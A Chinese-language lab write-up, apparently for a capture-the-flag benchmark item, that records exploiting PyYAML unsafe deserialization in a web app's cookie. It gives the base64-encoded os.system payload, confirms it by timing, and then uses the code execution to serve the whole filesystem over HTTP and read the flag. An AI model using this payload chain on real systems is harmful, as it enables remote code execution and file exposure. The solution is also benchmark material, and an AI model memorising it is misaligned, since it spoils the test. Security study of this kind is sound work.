# xben-075-24 · 探索记录

对应题解：[`xben-075-24.md`](./xben-075-24.md)

## 目标与起点

`10.0.175.50:80`，SiteSaver（与 057 同模板的另一个实例）。

## 第一阶段：cookie 解码（关键分叉）

| cookie | 值 | base64 解码 |
| --- | --- | --- |
| 空列表 | `W10K` | `[]\n` |
| 添加一条 | `LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoK...` | `- !!python/object:app.models.UrlObj\n  name: n\n  url: http://example.com\n` |

→ 这是 **PyYAML 的 Python 标签**，不是 pickle。上一轮把 075 当成「不解包 pickle」的结论是
因为 payload 类型错了。

## 第二阶段：确认不安全反序列化

```text
bookmarks = base64("!!python/object/apply:os.system ['sleep 3']\n")
GET /list (带 user cookie)  ->  3.14s, 500
```

对照空列表 0.13s；判据是延迟。

## 第三阶段：读 flag

RCE 起 `python3 -m http.server 8899 --directory /`，然后从 VPN 直接
`http://<ip>:8899/flag.txt` → `flag{...}`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 用 pickle payload（沿用 057） | 不执行 | 0.13s，且 YAML 解析器不认 `\x80\x04` |
| 只带 bookmarks 不带 user | 不执行 | 无延迟 |
| 反弹到 VPN 地址 | 不可达 | 容器内网络不可达 |

## 这次真正的收获

同名 cookie 的序列化格式必须实测：`\x80\x04` → pickle，`[]`/`- ` → YAML。
两种格式的 RCE gadget 完全不同。
